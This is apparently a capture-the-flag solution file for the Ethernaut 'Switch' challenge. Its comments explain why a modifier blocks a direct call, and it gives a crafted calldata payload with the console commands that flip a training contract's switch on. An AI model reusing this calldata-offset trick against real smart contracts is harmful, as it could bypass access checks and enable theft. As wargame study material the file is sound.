/*
    Well, this one gonna be quite difficult to understand, But I be still trying to get us through this stuff..

    Anyways, let's begin and just nail this challenge!!
*/

// First, we need to look at the code, which you must have probably been..Our task is to turn the switch on, and it can be done by calling the "turnSwitchOn" function, 
// but wait there's a modifier which is stopping us from doing that, and what this modifier says -> you can call this function just with the help of this contract...means 'internal' spooky thing going on here

// Then, you have noticed that 'flipSwitch' function which takes a calldata and can only call some functions, but yea yea..if you look carefully and try to understand the code (if you feel difficulty in that, come on just use that damn chatGPT). After getting the code understood, you will find that flipSwitch only allows us to call the 'turnSwitchOff' function which is not really helpful for us

// Let's move forward to the solution then, I will prefer you to go through some solutions online and one of them I took the help from these articles:

// 1. https://medium.com/@lu_ka_ra_ch_ki/ethernaut-level-29-switch-12e22210d394
// 2. https://blog.softbinator.com/solving-ethernaut-level-29-switch/

// Now just copy the code below and paste it in the ethernaut console
const attack = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000'

// and now you need to just send the transaction 
await sendTransaction({from: player, to: contract.address, data: attack})

// Now check for the switch
await contract.switchOn()

// True
